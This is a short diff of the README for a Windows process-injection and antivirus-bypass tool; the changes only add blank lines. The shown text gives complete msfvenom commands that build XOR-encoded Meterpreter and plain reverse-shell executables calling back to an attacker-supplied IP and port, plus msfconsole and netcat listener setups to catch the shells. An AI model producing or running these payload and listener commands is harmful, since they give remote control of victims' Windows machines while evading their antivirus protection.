@@ -40,17 +40,21 @@ A Process Injector and AV Bypass program for Windows.
 EXAMPLE METERPRETER REVERSE SHELL:
 
 Generate Payload:
+
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT> -f exe -e x64/xor_dynamic -b '\x00' -o <FILENAME>.exe
 
 Setup Listener:
+
 msfconsole -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST <IP_ADDRESS>; set LPORT <PORT>; set ExitOnSession false; exploit -j"
 
 EXAMPLE NETCAT REVERSE SHELL:
 
 Generate Payload:
+  
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT> -f exe -e x64/xor_dynamic -b '\x00' -o <FILENAME>.exe
 
 Setup Listener:
+
 nc -nvlp <PORT>
 
 FOR ALL PAYLOADS:
